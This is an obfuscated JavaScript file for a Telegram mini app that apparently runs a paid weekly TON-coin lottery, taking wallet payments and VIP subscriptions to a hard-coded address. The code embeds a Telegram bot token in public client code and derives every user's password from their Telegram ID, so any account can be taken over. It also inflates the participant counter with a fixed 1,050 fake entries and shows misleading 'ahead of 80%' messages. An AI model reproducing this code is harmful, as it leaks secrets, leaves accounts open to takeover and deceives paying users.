const m=b;(function(c,d){const l=b,e=c();while(!![]){try{const f=-parseInt(l(0x1b7))/(-0x2699+0x1*-0x322+0x29bc)*(parseInt(l(0x1ac))/(-0x222b+0xd92+-0xd3*-0x19))+-parseInt(l(0x1b6))/(0x1a81+-0x1a20+-0x5e)*(-parseInt(l(0x1d6))/(0x2*0x1258+0xe35+-0x32e1))+-parseInt(l(0x1db))/(0x25fe*0x1+-0x8bc+-0x1d3d)+-parseInt(l(0x194))/(-0x2f3+-0x1c52+0x1f4b)*(parseInt(l(0x17a))/(0xcb0+0x6d*0xb+0xde*-0x14))+parseInt(l(0x1c0))/(-0x17b*-0x17+-0x1f6c*0x1+0x23*-0x13)*(parseInt(l(0x176))/(-0x208b+0xa19+0x5*0x47f))+parseInt(l(0x174))/(-0x364+0x1446+-0x21b*0x8)+parseInt(l(0x1fc))/(-0x2*-0xcb3+-0x543*0x1+-0x1418)*(parseInt(l(0x17c))/(-0x2*0x11b4+-0x727+0x2a9b));if(f===d)break;else e['push'](e['shift']());}catch(g){e['push'](e['shift']());}}}(a,-0x11d9ca+0x28c24*-0x5+-0xf*-0x2c737));const paymentSection=document[m(0x1c1)](m(0x1d1)),usernameElement=document['getElementById']('username'),balanceElement=document[m(0x1c1)](m(0x1d8)),statusElement=document[m(0x1c1)](m(0x1e5)),progressBar=document[m(0x1c1)]('progress'),progressText=document[m(0x1c1)](m(0x19f)),notification=document[m(0x1fe)](m(0x1ce));notification[m(0x196)]=m(0x1f4),document['body'][m(0x1df)](notification);function b(c,d){const e=a();return b=function(f,g){f=f-(0x24a4+-0xce5*-0x2+-0x3cfd);let h=e[f];return h;},b(c,d);}function showNotification(c,d='error'){const n=m;notification[n(0x1f9)]=c,notification['className']=n(0x1d7)+d+'\x20show',setTimeout(()=>{notification['className']='notification';},-0x261a+-0x1ea*0xf+0x4e88);}function formatUsername(c){const o=m,d=-0x507+-0x3*0x911+-0x203f*-0x1;return c[o(0x192)]>d?c['slice'](-0xa0f+-0x264c+-0x1*-0x305b,d)+o(0x18e):c;}function formatBalance(c){const p=m;if(c>=-0x995d77be0b+0xf4fc7d*-0x13d90+-0x1*-0x2b218919d5b)return(c/(0xee53e5fb5f+0x87b65*-0x45b13+-0x1f72d12420*-0x1))[p(0x1a4)](0x21*-0xfd+-0x1ac5+0x3b64)+'T';else{if(c>=0x4952fd5*-0x1a+-0x48fdcb97+-0x1b*-0x952f13b)return(c/(-0x16269bc5*-0x4+-0x235cc93e+0x65d242a))[p(0x1a4)](-0x19b9+-0x25ad+0x3f68)+'B';else{if(c>=-0x1864ae+0x4ae1c*-0x1+0x2c550a)return(c/(0x168176+-0x158d91*-0x1+-0xb93*0x27d))['toFixed'](0xe0e+0x14b7+-0x22c3)+'M';else{if(c>=-0x13e9+-0x14dc+0x2cad)return(c/(0x1539+0x1d71+0x1*-0x2ec2))[p(0x1a4)](-0xb*-0x34b+-0x2127+-0x8*0x62)+'K';}}}return c[p(0x17e)]();}async function loginUser(c){const q=m,d=c+q(0x203),e=q(0x197)+c;try{const {data:f,error:g}=await supabase[q(0x175)]['signInWithPassword']({'email':d,'password':e});if(g){console[q(0x18d)](q(0x1e9));const {data:h,error:i}=await supabase[q(0x175)][q(0x19b)]({'email':d,'password':e});if(i)throw new Error(q(0x1ed)+i['message']);return console[q(0x18d)](q(0x1cb),h[q(0x1d2)]['id']),{'telegramId':c,'email':d};}return console['log'](q(0x1f5),f[q(0x1d2)]),{'telegramId':c,'email':d};}catch(j){console[q(0x1a9)](q(0x1d9),j['message']);throw j;}}const TELEGRAM_BOT_TOKEN=m(0x178),ADMIN_TELEGRAM_ID=0xcce7b2f5*0x1+-0x318d0c974+0x3e0d687bb;async function addUserToDatabase(c,d){const r=m;try{const {data:e,error:f}=await supabase[r(0x1b2)](r(0x1a0))[r(0x18a)]('*')['eq'](r(0x1d3),c)[r(0x1bb)]();if(f)throw new Error('Error\x20fetching\x20user\x20data:\x20'+f[r(0x1e1)]);if(!e){console[r(0x18d)](r(0x1da));const {error:g}=await supabase['from']('users')['insert']({'telegram_id':c,'email':d,'is_participating':![],'vip_status':![]});if(g)throw new Error(r(0x1ea)+g[r(0x1e1)]);}}catch(h){console[r(0x1a9)]('Error\x20adding\x20user\x20to\x20database:',h['message']);throw h;}}async function fetchUserDataFromTelegram(){const s=m;try{const c=window[s(0x1de)][s(0x1c3)];c[s(0x1f7)]();const d=c[s(0x1f6)][s(0x1d2)]?.['id'];if(!d)throw new Error(s(0x1a5));const e=c['initDataUnsafe'][s(0x1d2)]?.[s(0x173)]||'user_'+d;usernameElement[s(0x1f9)]=formatUsername(e);const f=d+s(0x203),g=await loginUser(d);await addUserToDatabase(d,f),await fetchUserBalance(d),await updateProgressBar();}catch(h){console[s(0x1a9)](s(0x181),h[s(0x1e1)]),showNotification(h['message']||'Failed\x20to\x20fetch\x20Telegram\x20data',s(0x1a9));}}async function fetchUserBalance(c){const t=m;try{const {data:d,error:e}=await supabase[t(0x1b2)](t(0x1a0))[t(0x18a)](t(0x1e8))['eq'](t(0x1d3),c)[t(0x1b4)]();if(e)throw new Error(e[t(0x1e1)]);if(d){balanceElement[t(0x1f9)]=formatBalance(d[t(0x1d8)]);const f=document[t(0x1c1)](t(0x180));if(d['vip_status'])statusElement[t(0x1f9)]='VIP\x20Participant',statusElement[t(0x1f0)]['backgroundImage']=t(0x198),statusElement[t(0x1f0)][t(0x195)]='transparent',statusElement[t(0x1f0)]['backgroundClip']=t(0x1f1),f['textContent']=t(0x19a),paymentSection[t(0x1f0)][t(0x185)]=t(0x1b1),document[t(0x1c1)](t(0x1eb))['style'][t(0x185)]=t(0x1b1);else d['is_participating']?(statusElement[t(0x1f9)]=t(0x207),statusElement[t(0x1f0)][t(0x195)]=t(0x199),f['textContent']=t(0x179),paymentSection[t(0x1f0)]['display']=t(0x1b1)):(statusElement[t(0x1f9)]='Not\x20Participated',statusElement[t(0x1f0)][t(0x195)]=t(0x1ee),f[t(0x1f9)]=t(0x19c),paymentSection[t(0x1f0)][t(0x185)]=t(0x1b9));}else balanceElement[t(0x1f9)]='0',showNotification(t(0x1e2),'error');}catch(g){console[t(0x1a9)](t(0x182),g),balanceElement[t(0x1f9)]=t(0x1c6),showNotification(t(0x1fd),t(0x1a9));}}async function updateProgressBar(){const u=m;try{const {data:c,error:d}=await supabase[u(0x1b2)](u(0x1a0))[u(0x18a)]('*')['eq'](u(0x1cc),!![]);if(d)throw new Error(d['message']);const {data:e,error:f}=await supabase[u(0x1b2)]('users')[u(0x18a)]('*')['eq'](u(0x1a6),!![]);if(f)throw new Error(f[u(0x1e1)]);const g=0xf2*0xa+-0x197f+0x1425,h=c[u(0x192)]+e[u(0x192)]*(0x7a0*-0x1+-0x13f9+-0x586*-0x5)+g,i=-0x2708+-0x1be2+0x2c33*0x2,j=Math['min'](h/ i*(-0x2*-0xa4c+0x1237+-0x266b),-0x1286+0x2f2*0x4+0x722);progressText[u(0x1f9)]=h+u(0x171),progressBar[u(0x1f0)]['width']=j+'%',h>=i&&showNotification('The\x20minimum\x20participants\x20have\x20been\x20reached!',u(0x205));}catch(k){console['error'](u(0x1f2),k),showNotification(u(0x1a7),u(0x1a9));}}import{createClient}from'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm';import{SUPABASE_URL,SUPABASE_ANON_KEY}from'./Scripts/config.js';const supabase=createClient(SUPABASE_URL,SUPABASE_ANON_KEY);async function notifyAdminForRegular(c,d){const v=m,e=getWalletAddress(),f='ðŸŸ¢\x20New\x20Regular\x20Participation:\x0a\x0aðŸ‘¤\x20ID\x20:\x20'+c+'\x0a\x0aðŸ“›\x20Username\x20:\x20@'+(d||v(0x206))+v(0x1cf)+e;await sendTelegramNotification(f);}async function notifyAdminForVIP(c,d,e){const w=m,f=getWalletAddress(),g=w(0x1a2)+c+w(0x1af)+(d||w(0x206))+w(0x1cf)+f+w(0x1a3)+e+w(0x1c5);await sendTelegramNotification(g);}async function sendTelegramNotification(c){const x=m,d=x(0x1c2)+TELEGRAM_BOT_TOKEN+x(0x1bc),e={'chat_id':ADMIN_TELEGRAM_ID,'text':c};try{const f=await fetch(d,{'method':'POST','headers':{'Content-Type':x(0x189)},'body':JSON['stringify'](e)}),g=await f[x(0x1dc)]();!g['ok']?(console[x(0x1a9)](x(0x1e6),g[x(0x1d5)]),showNotification(x(0x1b8)+g[x(0x1d5)],x(0x1a9))):console[x(0x18d)]('Admin\x20notified\x20successfully:',g);}catch(h){console[x(0x1a9)](x(0x186),h['message']),showNotification('Error\x20notifying\x20admin:\x20'+h[x(0x1e1)],'error');}}async function ensureWalletConnected(){const y=m;try{walletAddress=getWalletAddress();if(!walletAddress||walletAddress===y(0x1e3)){showNotification(y(0x1ff),'error'),await connectToWallet(),walletAddress=getWalletAddress();if(!walletAddress||walletAddress===y(0x1e3))throw new Error('Wallet\x20connection\x20required\x20to\x20proceed.');}return showNotification('Wallet\x20is\x20connected.',y(0x205)),!![];}catch(c){return console[y(0x1a9)](y(0x1ef),c),showNotification(c['message'],'error'),![];}}async function registerParticipation(){const z=m,c=window[z(0x1de)]['WebApp'],d=c['initDataUnsafe'][z(0x1d2)]?.['id'],e=c[z(0x1f6)][z(0x1d2)]?.[z(0x173)]||z(0x1b0)+d;try{const f=await ensureWalletConnected();if(!f)return;const {data:g,error:h}=await supabase['from'](z(0x1a0))[z(0x184)]({'is_participating':!![]})['eq']('telegram_id',d);if(h)throw new Error(h['message']);statusElement[z(0x1f9)]=z(0x207),statusElement[z(0x1f0)][z(0x195)]=z(0x199),await updateProgressBar(),await notifyAdminForRegular(d,e),showNotification(z(0x1bd),z(0x205));}catch(i){console[z(0x1a9)]('Error\x20updating\x20participation:',i),showNotification(z(0x19d),z(0x1a9));}}window[m(0x1de)][m(0x1c3)]['setHeaderColor'](m(0x1aa)),document[m(0x200)]('DOMContentLoaded',fetchUserDataFromTelegram);const tonConnectUI=new TON_CONNECT_UI[(m(0x1ab))]({'manifestUrl':m(0x1f8),'buttonRootId':m(0x1ca)});let walletAddress=null;async function connectToWallet(){const A=m;try{const c=tonConnectUI['wallet']!==null;if(c){showNotification(A(0x1e0),'info');return;}const d=await tonConnectUI['connectWallet']();walletAddress=d[A(0x193)][A(0x202)],localStorage[A(0x1bf)](A(0x1d4),walletAddress),showNotification(A(0x1c7),A(0x205)),console[A(0x18d)](A(0x1a8),walletAddress);}catch(e){console[A(0x1a9)]('Error\x20connecting\x20to\x20wallet:',e[A(0x1e1)]),showNotification(A(0x1a1)+e[A(0x1e1)],A(0x1a9));}}function getWalletAddress(){return localStorage['getItem']('walletAddress')||'Not\x20Connected';}tonConnectUI['uiOptions']={'twaReturnUrl':m(0x18c)};async function makePayment(){const B=m;try{const c=await ensureWalletConnected();if(!c)return;const d=B(0x18b),e='UQCpMg6TV_zE34ao-Ii2iz5M6s5Qp8OIVWa3YbsB9KwxzwCJ',f={'validUntil':Math[B(0x1cd)](Date[B(0x1fa)]()/(0xd15+-0x27e+-0x3b*0x1d))+(-0x22d2+-0x115d*-0x1+0x89*0x25),'messages':[{'address':e,'amount':d}]};await tonConnectUI[B(0x204)](f),showNotification(B(0x1be),B(0x205)),await registerParticipation();}catch(g){console['error']('Error\x20making\x20payment:',g),showNotification('Payment\x20failed:\x20'+g[B(0x1e1)],B(0x1a9));}}document[m(0x1c1)](m(0x1ca))[m(0x200)](m(0x1b3),connectToWallet),document[m(0x1c1)]('payNow')[m(0x200)](m(0x1b3),makePayment);function renderVIPLevels(){const C=m,c=[{'id':0x1,'name':C(0x177),'price':0xa,'features':C(0x1fb)},{'id':0x2,'name':'VIP\x20Platinum','price':0x1e,'features':'Premium\x20perks\x20and\x20maximum\x20chances.'}],d=document[C(0x1c1)](C(0x1eb));d[C(0x1e7)]=C(0x1ba),d['innerHTML']+=c[C(0x183)](e=>'\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22vip-level\x22>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>'+e[C(0x1e4)]+C(0x1ae)+e['price']+C(0x17f)+e[C(0x1ad)]+')\x22>Subscribe</button>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22vip-features\x22>Features:\x20'+e[C(0x190)]+'</p>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x0a\x20\x20\x20\x20')[C(0x1b5)]('');}function a(){const G=['maybeSingle','/sendMessage','Participation\x20confirmed\x20successfully!','The\x20operation\x20was\x20completed\x20successfully','setItem','16UpxBPS','getElementById','https://api.telegram.org/bot','WebApp','UQCpMg6TV_zE34ao-Ii2iz5M6s5Qp8OIVWa3YbsB9KwxzwCJ','\x20TON','Error','Wallet\x20connected\x20successfully!','fullscreen-container','DOMContentLoaded','ton-connect','New\x20user\x20created\x20successfully:','is_participating','floor','div','\x0a\x0aðŸ’¼\x20Wallet\x20:\x20https://tonviewer.com/','.container','paymentSection','user','telegram_id','walletAddress','description','4ksNCoA','notification\x20','balance','Error\x20logging\x20in\x20or\x20registering\x20user:','No\x20user\x20data\x20found\x20in\x20database.\x20Adding\x20user.','5957290YbMwaE','json','fullscreen','Telegram','appendChild','Wallet\x20is\x20already\x20connected.','message','No\x20balance\x20found\x20for\x20this\x20user.','Not\x20Connected','name','participationStatus','Telegram\x20API\x20Error:','innerHTML','balance,\x20is_participating,\x20vip_status','User\x20not\x20found\x20in\x20auth\x20system.\x20Creating\x20a\x20new\x20account.','Failed\x20to\x20insert\x20user\x20data:\x20','vipSection','onEvent','Failed\x20to\x20register\x20user:\x20','red','Wallet\x20connection\x20error:','style','text','Error\x20updating\x20progress\x20bar:','VIP\x20subscription\x20failed:\x20','notification','User\x20logged\x20in\x20successfully:','initDataUnsafe','ready','https://sawcoin.vercel.app/json/tonconnect-manifest.json','textContent','now','Enhanced\x20perks\x20and\x20increased\x20chances.','139315bNRgcs','Failed\x20to\x20fetch\x20user\x20balance.','createElement','Please\x20connect\x20your\x20wallet\x20to\x20proceed.','addEventListener','Error\x20subscribing\x20to\x20VIP:','address','@SawToken.coin','sendTransaction','success','N/A','Regular\x20Participant','\x20Participants','Failed\x20to\x20activate\x20full-screen\x20mode:','username','2987090JvoGKw','auth','5694237yanUOW','VIP\x20Gold','7540338527:AAH4A_gOp_FTR3jRdtNa-QcfCCLRMIN0FDo','You\x27re\x20ahead\x20of\x2050%\x20of\x20participants!\x20Keep\x20going,\x20your\x20victory\x20is\x20within\x20reach!','7goTjva','isFullscreen','1068OQbcMh','requestFullscreen','toString','\x20TON</p>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20onclick=\x22subscribeVIP(','Statustxtprogress','Error\x20fetching\x20Telegram\x20data:','Error\x20fetching\x20user\x20balance:','map','update','display','Error\x20notifying\x20admin:','querySelector','remove','application/json','select','1000000000','https://t.me/SAWCOIN_BOT/GAME','log','...','.top-bar','features','add','length','account','5643126eoskCw','color','className','password_','linear-gradient(to\x20right,\x20#FFD700,\x20#8A2BE2)','#2D83EC','You\x27re\x20ahead\x20of\x2080%\x20of\x20all\x20participants!\x20Get\x20ready\x20to\x20win\x20big!','signUp','You\x20have\x20no\x20chances\x20to\x20win!\x20Join\x20now\x20and\x20seize\x20your\x20opportunity!','Failed\x20to\x20register\x20participation.','classList','participantCount','users','Failed\x20to\x20connect\x20wallet:\x20','ðŸŒŸ\x20New\x20VIP\x20Subscription:\x0a\x0aðŸ‘¤\x20ID\x20:\x20','\x0a\x0aðŸ’°\x20Paid\x20:\x20','toFixed','Telegram\x20user\x20ID\x20is\x20missing','vip_status','Failed\x20to\x20update\x20progress\x20bar.','Wallet\x20Address:','error','#101010','TonConnectUI','14cjCsIf','price','</h3>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22vip-Price\x22>\x20Price\x20:\x20','\x0a\x0aðŸ“›\x20Username\x20:\x20@','user_','none','from','click','single','join','2616027bhTQwb','100693erMpnB','Failed\x20to\x20notify\x20admin:\x20','block','\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20<p\x20id=\x22Statustxtvip\x22>\x20Get\x20more\x20chances\x20to\x20win\x20</p>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20<p\x20id=\x22Statustxtprogressvip\x22>\x20VIP\x20subscriptions\x20allow\x20you\x20to\x20increase\x20your\x20chances\x20of\x20winning\x20the\x20weekly\x20lottery\x20</p>\x0a\x0a\x20\x20\x20\x20'];a=function(){return G;};return a();}window['subscribeVIP']=async function(c){const D=m,d=window[D(0x1de)][D(0x1c3)],e=d[D(0x1f6)][D(0x1d2)]?.['id'],f=d[D(0x1f6)][D(0x1d2)]?.[D(0x173)]||'user_'+e;try{const g=await ensureWalletConnected();if(!g)return;const h={'validUntil':Math[D(0x1cd)](Date[D(0x1fa)]()/(-0x19ea+-0x72d+0x24ff))+(0x1a67+-0x164e*0x1+-0x1*0x1c1),'messages':[{'address':D(0x1c4),'amount':(c*(0x1d*-0x13f9c0f+-0x87671f2+0x1*0x6845e9a5))[D(0x17e)]()}]};await tonConnectUI[D(0x204)](h);const {error:i}=await supabase[D(0x1b2)]('users')['update']({'vip_status':!![]})['eq'](D(0x1d3),e);if(i)throw new Error(i['message']);await notifyAdminForVIP(e,f,c),showNotification('VIP\x20subscription\x20successful!','success');}catch(j){console[D(0x1a9)](D(0x201),j),showNotification(D(0x1f3)+j[D(0x1e1)],D(0x1a9));}},document['addEventListener'](m(0x1c9),renderVIPLevels),document['addEventListener']('DOMContentLoaded',()=>{const E=m,c=document[E(0x187)](E(0x18f)),d=document[E(0x187)](E(0x1d0));function e(){const F=E;Telegram['WebApp'][F(0x17b)]?(c[F(0x19e)][F(0x191)](F(0x1dd)),d[F(0x19e)]['add']('fullscreen-container')):(c[F(0x19e)]['remove'](F(0x1dd)),d[F(0x19e)][F(0x188)](F(0x1c8)));}e(),Telegram[E(0x1c3)][E(0x1ec)]('fullscreenChanged',e);try{Telegram[E(0x1c3)][E(0x17d)]();}catch(f){console[E(0x1a9)](E(0x172),f);}});
